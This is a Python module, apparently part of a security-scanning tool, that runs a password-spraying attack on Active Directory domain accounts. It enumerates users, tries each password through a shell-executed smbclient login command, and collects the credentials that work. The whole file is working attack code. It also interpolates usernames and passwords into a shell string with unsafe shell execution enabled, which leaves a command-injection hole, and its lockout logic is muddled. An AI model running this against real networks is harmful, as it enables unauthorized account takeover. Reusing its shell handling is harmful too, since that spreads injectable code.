"""
Password Spraying Attack Module

Executes password spraying attack against domain accounts
"""

import time
import asyncio
from typing import Dict, Any, List
from ....proto import ScanOptions, DirectoryType
from ...enumeration.user_enumerator import UserEnumerator
from utils.async_subprocess import run_shell


class PasswordSprayAttack:
    """Executes password spraying attack"""
    
    def __init__(self, plugin_instance):
        self.plugin = plugin_instance
        self.user_enumerator = UserEnumerator(plugin_instance)
    
    async def execute(self, scan_options: ScanOptions, directory_type: DirectoryType,
                     passwords: List[str], lockout_threshold: int = 5) -> Dict[str, Any]:
        """
        Executes password spraying attack against domain accounts
        
        Args:
            scan_options: Scan parameters
            directory_type: Directory type
            passwords: List of passwords to try
            lockout_threshold: Maximum failed attempts before stopping
            
        Returns:
            Dict[str, Any]: Attack results
        """
        result = {
            "success": False,
            "valid_credentials": [],
            "errors": [],
            "statistics": {
                "total_attempts": 0,
                "successful_logins": 0,
                "execution_time": 0
            }
        }
        
        start_time = time.time()
        
        if not scan_options.domain_name:
            result["errors"].append("Domain name not specified")
            return result
        
        if not passwords:
            result["errors"].append("Password list not provided")
            return result
        
        try:
            # Get list of users to test
            users = await self.user_enumerator.enumerate(scan_options, directory_type)
            
            if not users:
                result["errors"].append("No users found to test")
                return result
            
            valid_credentials = []
            
            for password in passwords:
                if len(valid_credentials) >= lockout_threshold:
                    break
                
                for user in users[:lockout_threshold]:  # Limit attempts per password
                    try:
                        # Try authentication using smbclient or similar
                        test_cmd = f"smbclient -L {scan_options.ldap_server or scan_options.domain_name} -U {scan_options.domain_name}/{user.sam_account_name}%{password} -N"
                        rc, _, _ = await run_shell(test_cmd, timeout=10, allow_unsafe_shell=True)
                        
                        result["statistics"]["total_attempts"] += 1
                        
                        if rc == 0:
                            valid_credentials.append({
                                "username": user.sam_account_name,
                                "password": password,
                                "domain": scan_options.domain_name
                            })
                            result["statistics"]["successful_logins"] += 1
                        
                        # Small delay to avoid lockout
                        await asyncio.sleep(2)
                    
                    except Exception:
                        pass
            
            result["valid_credentials"] = valid_credentials
            result["success"] = True
        
        except Exception as e:
            result["errors"].append(f"Error during password spraying: {str(e)}")
        
        result["statistics"]["execution_time"] = time.time() - start_time
        
        return result

